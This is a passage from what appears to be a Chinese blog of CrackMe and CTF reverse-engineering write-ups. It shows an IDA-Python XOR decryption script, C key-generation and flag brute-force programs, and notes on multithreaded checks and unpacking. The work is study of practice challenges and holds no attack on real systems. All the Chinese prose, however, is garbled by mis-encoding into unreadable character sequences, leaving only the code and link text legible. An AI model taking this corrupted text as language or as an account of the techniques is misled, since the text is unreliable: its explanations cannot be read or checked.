class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æŒºå¿«å°±å¾—åˆ°äº†ç­”æ¡ˆï¼Œä¸»è¦æ˜¯è¦ä¼˜åŒ–å»é™¤ä¸å¯èƒ½çš„å­—ç¬¦ã€‚<img src="/2020/07/31/CrackMe/image-20200813135150617.png" alt="image-20200813135150617"></p><p>ä»¥ä¸ºåˆ°è¿™é‡Œåº”è¯¥å°±ç»“æŸäº†ï¼Œè§£å¯†å‡ºçš„ä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¯¹keyä¸nameåˆ¤æ–­ï¼Œç®—æ³•ä¼šå¾ˆç®€å•ã€‚æ˜¯æˆ‘æƒ³å¤šäº†ğŸ¤£ï¼Œè¯´èµ·è¿™ä¸ªç®—æ³•æˆ‘å°±æ˜¯ç—›ï¼ŒèŠ±äº†å¥½å¤šæ—¶é—´åŠ¨è°ƒçŒœæµ‹ä¸€äº›å‡½æ•°çš„ä½œç”¨ï¼Œä¼ªä»£ç å®åœ¨ä¸å¥½çœ‹ï¼Œä¹Ÿä¸æƒ³çœ‹äº†ï¼Œæ±‡ç¼–å°±ä¸è¯´äº†ã€‚ã€‚</p><p><strong>å¼€å§‹è¿›å…¥è§£å¯†éƒ¨åˆ†</strong></p><p>å†™ida-pythonè„šæœ¬å¯¹<strong>00402010</strong>å¼€å§‹çš„ä»£ç è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x402010</span></span><br><span class="line">s = [<span class="number">89</span>, <span class="number">63</span>, <span class="number">-85</span>, <span class="number">-97</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xab0</span>):</span><br><span class="line">    PatchByte(addr+i, (Byte(addr+i)^s[i&amp;<span class="number">3</span>])&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>æ¥åˆ°è§£å¯†åçš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200813141328038.png" alt="image-20200813141328038"></p><p>ç”±äºæœ€åè¦nameè®¡ç®—å‡ºçš„æ•´æ•°ä¸keyè®¡ç®—å‡ºçš„æ•´æ•°ç›¸ç­‰ï¼Œè€Œnameè®¡ç®—å‡ºçš„æ•´æ•°åœ¨ODçš„å†…å­˜ä¸­åå…­è¿›åˆ¶å­˜æ”¾ï¼Œè¿™æ˜¯å¯ä»¥çœ‹åˆ°çš„ã€‚è€Œkeyè®¡ç®—å‡ºæ•°æ®æ—¶ä¹Ÿæ˜¯ä¾æ¬¡å¾—åˆ°æ•°æ®çš„æ¯ä¸€ä½ï¼Œç„¶å*16è½¬åŒ–ä¸€ä¸ªæ•´æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦è®©keyè®¡ç®—å‡ºçš„æ¯ä¸€ä½ä¸nameè®¡ç®—åçš„æ•°æ®çš„æ¯ä¸€ä½ç›¸ç­‰å³å¯ã€‚ä¸”16è¿›åˆ¶æ•°åªæœ‰â€œ0123456789ABCDEFâ€è¿™äº›æ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå¾—åˆ°ä¸€å¼ è¿™æ ·çš„æ˜ å°„è¡¨ã€‚</p><p>æ¨¡æ‹Ÿsub_4021A0ä¸sub_402A40å‡½æ•°å¾—åˆ°è¡¨ï¼š<strong>è¿™é‡Œæˆ‘å¯¹sub_402A40è¿›è¡Œäº†ç®€åŒ–ï¼Œå› ä¸ºåªæœ‰0-Fçš„æ•°å­—ï¼Œæ‰€ä»¥åªæœ‰è¿™å‡ ä¸ªå°æ­£æ•°æƒ…å†µã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i^<span class="number">0x86</span>)<span class="number">-48</span>) == j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#123;%#X"</span>, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", %#X"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144333400.png" alt="image-20200813144333400"></p><p>æœ€åæˆ‘ä»¥è®¡ç®—nameä¸ºBxbçš„keyï¼Œäº‹å…ˆå¾—åˆ°äº†Bxbè®¡ç®—å‡ºçš„æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"1D702A7304A94"</span>;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0XB6</span>, <span class="number">0XB7</span>, <span class="number">0XB4</span>, <span class="number">0XB5</span>, <span class="number">0XB2</span>, <span class="number">0XB3</span>, <span class="number">0XB0</span>,</span><br><span class="line">   <span class="number">0XB1</span>, <span class="number">0XBE</span>, <span class="number">0XBF</span>, <span class="number">0XBC</span>, <span class="number">0XBD</span>, <span class="number">0XBA</span>, <span class="number">0XBB</span>, <span class="number">0XB8</span>, <span class="number">0XB9</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"BEEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = s[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt;= <span class="number">48</span> &amp;&amp; temp &lt;= <span class="number">57</span>)</span><br><span class="line">temp -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">temp -= <span class="number">55</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(flag+i*<span class="number">2</span>+<span class="number">4</span>, <span class="string">"%X"</span>, a[temp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144918630.png" alt="image-20200813144918630"></p><p>åšåˆ°è¿™ï¼ŒçœŸçš„ä¸æƒ³å†çœ‹è¿™ä¸ªé¢˜äº†ï¼Œæˆ‘å°±æƒ³ä¸é€šï¼Œä¼ªä»£ç æ€ä¹ˆå¦‚æ­¤ç»•ï¼Œkeyçš„ç”Ÿæˆç®—æ³•éƒ½åŠ¨è°ƒäº†å¥½å¤šéã€‚æ‰€ä»¥é‚£ä¸ªnameè®¡ç®—çš„ç®—æ³•ä¹ŸçœŸçš„ä¸æƒ³çœ‹äº†ã€‚ã€‚ã€‚è¿›è€Œä¸èƒ½å¾—åˆ°æ³¨å†Œæœºã€‚</p><p>å…¶æ¬¡è¿™ä¸ªé¢˜ï¼Œå¯¹è¦æ”¹å˜æ•°æ®çš„å†…å­˜åœ°å€ï¼Œä¼ å‚éƒ½æ˜¯ä½¿ç”¨ecxä¼ å‚æŒ‡å‘this*ã€‚</p><h2 id="ä¹˜é£ç ´æµª"><a href="#ä¹˜é£ç ´æµª" class="headerlink" title="ä¹˜é£ç ´æµª"></a>ä¹˜é£ç ´æµª</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>é¢˜ç›®éš¾ç‚¹ï¼šé¢˜ç›®å¼€å§‹å¯åŠ¨åŒçº¿ç¨‹ï¼Œçº¿ç¨‹ä¹‹é—´ä»¥äº‹ä»¶é€šè®¯ã€‚å¯¹äºä¸æ¸…æ¥šåŒçº¿ç¨‹ï¼Œè‡ªç„¶ä¼šæœ‰å¾ˆå¤šç–‘é—®ï¼Œè·Ÿè¸ªç¨‹åºèµ·æ¥ä¹Ÿä¼šå›°éš¾ä¸€äº›ã€‚</p><p>é¦–å…ˆä»¥ä¸çŸ¥é“åŒçº¿ç¨‹çš„è§’åº¦æ¥è·Ÿè¸ªç¨‹åºï¼š</p><p>æŸ¥çœ‹ç¨‹åºä¸­çš„è·å–æ§ä»¶æ–‡æœ¬å†…å®¹çš„APIï¼Œæœç´¢å‘ç°æ²¡æœ‰GetDlgItemTextï¼Œä½†æ˜¯æœ‰GetWindowTextLenthWä¸GetWindowTextWã€‚åŒå‡»è¿›å…¥ã€‚<img src="/2020/07/31/CrackMe/image-20200731174647264.png" alt="image-20200731174647264"></p><p>ç”±äºåé¢è‚¯å®šä¼šå¯¹è¾“å…¥æ•°æ®è¿›è¡ŒéªŒè¯å¤„ç†ï¼Œæ‰€ä»¥åœ¨æ•°æ®çª—å£å¯¹è¯¥åœ°å€ä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹, F9è¿è¡Œæ–­ä¸‹åï¼š<img src="/2020/07/31/CrackMe/image-20200731175348583.png" alt="image-20200731175348583"></p><p>ä¸Šé¢æ±‡ç¼–ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯æ¯”è¾ƒè¾“å…¥çš„nameä¸keyæ˜¯å¦ç›¸ç­‰ä¸”æœ€åä»¥è¿™ä¸ªæ¥ç¡®å®šè¿”å›å€¼ï¼Œå°è¯•æ‰“å¼€ç¨‹åºçœ‹éªŒè¯ä¸€ä¸‹ï¼Œä¸å¯¹çš„ã€‚ç»§ç»­è·Ÿç€ç¨‹åºè¿”å›ï¼šæ—¢ç„¶ä¸Šä¸€ä¸ªéªŒè¯å‡½æ•°æ˜¯é”™è¯¯çš„ï¼Œä¸‹é¢è¿™ä¸ªç®­å¤´æ‰€æŒ‡è·³è½¬å°±ä¸èƒ½å®ç°æ‰æ­£ç¡®ã€‚<img src="/2020/07/31/CrackMe/image-20200731175649160.png" alt="image-20200731175649160"></p><p>ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨åï¼Œå•æ­¥åˆ†æ401299ä»¥ä¸‹çš„ä»£ç ï¼Œå¾ˆå¤šæ— ç”¨çš„è·³è½¬ï¼Œè¿˜æ˜¯ç®€å•ï¼Œä¸€ä¸ªéªŒè¯ï¼šnameä¸keyçš„é€†åºæ˜¯å¦ç›¸ç­‰ä¸”é•¿åº¦è¦ä¸å°äº8ã€‚å†æ¬¡æ‰“å¼€ç¨‹åºéªŒè¯ä¸€ä¸‹ï¼Œæ­£ç¡®ã€‚æ‰€ä»¥ç¨‹åºçš„keyåªè¦æ˜¯nameçš„é€†åºå°±æ­£ç¡®ã€‚</p><p>å½“ç„¶æˆ‘å¯¹ç¨‹åºè¿˜æ˜¯æœ‰å¾ˆå¤šç–‘é—®ï¼Œä»å‡ºé¢˜äººçš„å¸–å­çœ‹åˆ°è¯´æ˜¯åŒçº¿ç¨‹ã€‚</p><p>å¼€å§‹å»å­¦ä¹ å¤šçº¿ç¨‹çš„çŸ¥è¯†ï¼Œè§‰å¾—è®²çš„å¾ˆæ¸…æ¥šçš„ä¸€ä¸ªå¸–å­ï¼š<a href="https://blog.csdn.net/LL596214569/article/details/89163734" target="_blank" rel="noopener">https://blog.csdn.net/LL596214569/article/details/89163734</a></p><p>äº†è§£å¤šçº¿ç¨‹åï¼Œç†è§£è¿™ä¸ªç¨‹åºå°±å¾ˆå¥½äº†ï¼Œé¦–å…ˆæ˜¯çœ‹æ˜¯å¦æœ‰åˆ›å»ºäº‹ä»¶ï¼ŒæŸ¥æ‰¾APIï¼šCreatEventã€‚åœ¨åˆ›å»ºçº¿ç¨‹APIï¼šCreatThreadä¸‹æ–­ç‚¹ï¼Œä»CreatThreadæ‰¾åˆ°çº¿ç¨‹å‡½æ•°çš„åœ°å€ã€‚æ¥ç€å°±æ˜¯ä¸‹å›¾ä¸­çš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200731182155636.png" alt="image-20200731182155636"></p><p><strong>æœ€å</strong>ï¼Œæ‰€ä»¥ç¨‹åºçš„æ•´ä½“é€»è¾‘å°±æ˜¯é¦–å…ˆåˆ›å»º2ä¸ªäº‹ä»¶ï¼Œå†åˆ›å»º2ä¸ªçº¿ç¨‹ï¼Œ2ä¸ªçº¿ç¨‹å‡½æ•°éƒ½æœ‰WaitForSingleObjectå‡½æ•°ä¸€ç›´ç­‰å¾…äº‹ä»¶çš„ä¿¡å·åå†å‘ä¸‹ç»§ç»­æ‰§è¡Œã€‚è€Œæˆ‘ä»¬è¾“å…¥nameä¸keyåç‚¹å‡»Okå°±ä¼šå‘ç”ŸæŒ‰é’®äº‹ä»¶ï¼Œè§¦å‘OSå‘ç¨‹åºå‘ç°æ¶ˆæ¯ï¼Œç„¶åæ‰§è¡ŒSetEventå‡½æ•°å°†æŒ‡å®šçº¿ç¨‹çš„WaitForSingleObjectå‡½æ•°ç­‰å¾…çš„æŒ‡å®šäº‹ä»¶è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ã€‚<img src="/2020/07/31/CrackMe/image-20200731183904491.png" alt="image-20200731183904491"></p><p>æ¥ä¸‹æ¥åœ¨è¯¥çº¿ç¨‹è¿›è¡ŒéªŒè¯nameä¸keyï¼Œå¦‚æœéªŒè¯é€šè¿‡çš„è¯è®¾ç½®å¦å¤–ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…çš„æŒ‡å®šçš„äº‹ä»¶è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¼€å§‹æ‰§è¡Œæ˜¾ç¤ºæç¤ºæ­£ç¡®çš„å¯¹è¯æ¡†çš„ä»£ç ã€‚<strong>ç®€è€Œè¨€ä¹‹ï¼šä¸€ä¸ªçº¿ç¨‹è´Ÿè´£éªŒè¯ï¼Œä¸€ä¸ªçº¿ç¨‹è´Ÿè´£æ˜¾ç¤ºã€‚</strong></p><h2 id="æ¸å…¥ä½³å¢ƒ"><a href="#æ¸å…¥ä½³å¢ƒ" class="headerlink" title="æ¸å…¥ä½³å¢ƒ"></a>æ¸å…¥ä½³å¢ƒ</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œæœ‰é”™è¯¯è¾“å…¥æç¤ºæ¡†ã€‚</p><p>ä¸Šæ‰‹ç›´æ¥æ‰¾MessageBoxï¼Œåˆ°è¾¾ä»£ç å¤„å‘ä¸Šåˆ†æï¼šæ‰€ä»¥æˆ‘ä»¬è¦å‘ä¸Šå›æº¯æ‰¾åˆ°å¯¹ebp+cèµ‹å€¼å¤„ã€‚<img src="/2020/07/31/CrackMe/image-20200801132230026.png" alt="image-20200801132230026"></p><p>ç»§ç»­å‘ä¸Šå›æº¯å¯ä»¥çœ‹åˆ°ï¼š<img src="/2020/07/31/CrackMe/image-20200801132543497.png" alt="image-20200801132543497"></p><p>æ‰€ä»¥ä¸‹é¢è·³è½¬çš„åœ°æ–¹å°±æ˜¯éªŒè¯è¿‡ç¨‹ï¼šç®—æ³•å¾ˆç®€å•ã€‚<img src="/2020/07/31/CrackMe/image-20200801132628646.png" alt="image-20200801132628646"></p><h2 id="CrackMe01"><a href="#CrackMe01" class="headerlink" title="CrackMe01"></a>CrackMe01</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªâ€œç™¾åº¦æ¯â€CTFæ¯”èµ›åä¸€æœˆåœº</p><p>è¿˜æ˜¯ä¸Šæ‰‹è½½å…¥ODï¼Œæ‰¾ä¸€ä¸‹è·å–è¾“å…¥æ–‡æœ¬ç›¸å…³çš„APIï¼š<img src="/2020/07/31/CrackMe/image-20200805164512873.png" alt="image-20200805164512873"></p><p>å¼€å§‹åªçœ‹åˆ°ç¬¬ä¸€ä¸ªï¼Œä¸‹æ–­ååœ¨ç¨‹åºè¾“å…¥å†…å®¹åå´æ²¡æœ‰æ–­ä¸‹ã€‚è¿˜ä»¥ä¸ºåˆæ˜¯å¤šçº¿ç¨‹ï¼Œåˆ†æä¸€æ³¢åç¡®å®åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†ä¸å¯¹ã€‚åé¢æ‰åœ¨ç¬¬äºŒä¸ªGetWindowTextWä¸‹æ–­ï¼Œè¾“å…¥å†…å®¹åç¨‹åºæ–­ä¸‹ã€‚</p><p>å•æ­¥è·Ÿè¸ªåå‘ç°ï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¼ åˆ°å¦å¤–ä¸€ä¸ªå†…å­˜ç©ºé—´å­˜å‚¨åï¼Œå†è°ƒç”¨PostMessageWå‡½æ•°å°†è¾“å…¥å­—ç¬¦ä¼ ç»™æŒ‡å®šå¥æŸ„çš„çª—å£ã€‚è¿™é‡Œæ‰“å¼€idaçœ‹ä¸‹ï¼š<img src="/2020/07/31/CrackMe/image-20200805170315887.png" alt="image-20200805170315887"></p><p>ä¹‹åå¯ä»¥ç›´æ¥æŸ¥æ‰¾é»˜è®¤æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼šDefWindowProc æ¥å®šä½å¤„ç†è¾“å…¥å­—ç¬¦çš„ä»£ç å¤„ã€‚</p><p>è¿™é‡Œçœ‹PostMessageå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°çš„äº¤å‰å¼•ç”¨æ¥å®šä½ç›®çš„ä»£ç ã€‚å› ä¸ºhWndæ˜¯æ¥æ”¶æ¶ˆæ¯çš„çª—å£å¥æŸ„ï¼Œæˆ‘ä»¬çœ‹ä¸ªçª—å£çš„å¥æŸ„èµ‹å€¼ç»™äº†hWndã€‚hWndæ˜¯å…¨å±€å˜é‡ã€‚</p><p>ä»äº¤å‰å¼•ç”¨æ¥åˆ°ä¸‹é¢çš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200805172125636.png" alt="image-20200805172125636"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨äº†WinClasså®šä¹‰äº†ä¸€ä¸ªçª—å£çš„ç±»ï¼Œå¯¹æ¯ä¸ªå±æ€§èµ‹å€¼åä½¿ç”¨RegisterClassWæ¥æ³¨å†Œçª—å£ï¼Œæœ€åé€šè¿‡CreatWindowExWå°†è¯¥çª—å£å®ä¾‹åŒ–ï¼Œå¹¶æ­¤çª—å£å¥æŸ„èµ‹å€¼ç»™Hwndã€‚æ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å‘é€ç»™äº†è¿™ä¸ªçª—å£ã€‚</p><p>å¦å¤–ï¼ŒWndClassä¸­çš„æˆå‘˜lpfnWndProcæŒ‡å‘ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œæ˜¯çª—ä½“çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ã€‚<strong>å®ƒæ¥å—åˆ°PostMessageWå‘é€æ¥çš„æ¶ˆæ¯åå³è°ƒç”¨ã€‚</strong></p><p>è¿›å…¥è¯¥çª—å£æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200805172955592.png" alt="image-20200805172955592"></p><p>ä»ä¸Šé¢å‡½æ•°çŸ¥é“ï¼Œè™½ç„¶ä¸çŸ¥é“è¾“å…¥çš„å…·ä½“å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯å¯ä»¥çˆ†ç ´å‡ºç´¯åŠ å’Œï¼Œä¸”ä¸å¤§äº17*122 = 2074ï¼ˆå› ä¸ºè¾“å…¥å­—ç¬¦é•¿åº¦&lt;= 17ï¼‰ã€‚å¾—åˆ°ç´¯åŠ å’Œæˆ‘ä»¬å°±èƒ½çŸ¥é“ï¼Œçª—å£æ˜¾ç¤ºå‡ºçš„æ˜¯ä»€ä¹ˆå†…å®¹äº†ã€‚</p><p>å†™ç¨‹åºæ”¶å·¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xF5</span>, <span class="number">0x04</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xE9</span>, <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x04</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2074</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i&amp;<span class="number">0xf00</span>) == <span class="number">1024</span>) &amp;&amp; ((i&amp;<span class="number">0xf0</span>) == <span class="number">0xb0</span>) &amp;&amp; ((i&amp;<span class="number">6</span>) == <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">44</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[k++] = *(<span class="keyword">short</span> <span class="keyword">int</span> *)&amp;ida_chars[j]^i; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag), k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(flag, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°ï¼šå³ç¬¬ä¸€ä¸ªæ»¡è¶³ã€‚<img src="/2020/07/31/CrackMe/image-20200805173523092.png" alt="image-20200805173523092"></p><h2 id="dame"><a href="#dame" class="headerlink" title="dame"></a>dame</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªDAMNâ€™s Official joining Contestï¼ˆæ˜¯ä¸€ä¸ªæœºæ„çš„åŠ å…¥æµ‹è¯•ï¼Œå°†ç¨‹åºæŒ‡å®šç ´è§£å¹¶å†™å‡ºæ³¨å†Œæœºï¼‰</p><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog</a> æå–ç ï¼šh0z9</p><p>è¦æ±‚ï¼šå¤§æŒ‰é’®å’Œæ ‡é¢˜æ˜¾ç¤ºæœªé”å®šçš„æ¶ˆæ¯å¹¶ä¸”ç¨‹åºè¯´æŒ‰é’®è¢«æŒ‰ä¸‹æ—¶æœªé”å®šä¸æ³¨å†Œæœºçš„ç¼–å†™ã€‚<img src="/2020/07/31/CrackMe/image-20200806181244476.png" alt="image-20200806181244476"></p><p>è½½å…¥ODå‘ç°æœ‰å£³ï¼Œç›´æ¥å †æ ˆå¹³è¡¡åŸç†æŠŠå£³å¸¦èµ°ï¼Œç„¶ådumpå‡ºæ— å£³æ–‡ä»¶ã€‚</p><p>ç”±äºæˆ‘ä»¬è¦ä¿®æ”¹å¯¹è¯æ¡†æ¨¡å—ä¸Šçš„å†…å®¹ï¼Œæ‰€ä»¥é¦–å…ˆæ‰¾åˆ°åˆ›å»ºå¯¹è¯æ¡†å‡½æ•°ã€‚ODè½½å…¥åœ¨ç¨‹åºå…¥å£ç‚¹å³å¯çœ‹åˆ°ï¼šDialogBoxParamA<img src="/2020/07/31/CrackMe/image-20200806181904819.png" alt="image-20200806181904819"></p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾ä¸­çš„å¯¹è¯æ¡†è¿‡ç¨‹å‡½æ•°çš„èµ·å§‹åœ°å€ï¼š<strong>401045</strong>ï¼Œè¯¥å¤„ä»£ç å¥½åƒæ²¡æœ‰è¯†åˆ«å‡ºæ¥ï¼Œä¸”ä¸‹æ–­æœ‰æç¤ºå¹¶ä¸”æ‰§è¡Œå¾ˆå¥‡æ€ªã€‚è½½å…¥idaä¸­çœ‹çœ‹ï¼š<img src="/2020/07/31/CrackMe/image-20200806182148079.png" alt="image-20200806182148079"></p><p>æ‰€ä»¥enteråœ¨ODä¸­æ²¡æœ‰è¯†åˆ«å‡ºæ¥ï¼Œä¸”401035-401045ç¡®å®æ•°æ®ï¼Œ401049æ‰æ˜¯ä»£ç å¼€å§‹ï¼Œæ‰€ä»¥è¿”å›ODè¿›è¡Œå¤„ç†ï¼Œæ³¨æ„ä¸èƒ½nopï¼Œå› ä¸ºæ•°æ®åœ¨åé¢æœ‰ä½¿ç”¨åˆ°ï¼Œç›´æ¥ä¸‹æ–­401049ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œä¸æ–­å•æ­¥è°ƒè¯•çŸ¥é“ï¼ŒDialogProcå‡½æ•°æ ¹æ®ä¸åŒçš„æ¶ˆæ¯åšå‡ºç›¸åº”çš„å“åº”ã€‚é¦–å…ˆåˆ›å»ºæ•´ä¸ªå¯¹è¯æ¡†æ¨¡æ¿ï¼Œç„¶åä¸æ–­è½½å…¥å„ç§æ§ä»¶ã€‚<img 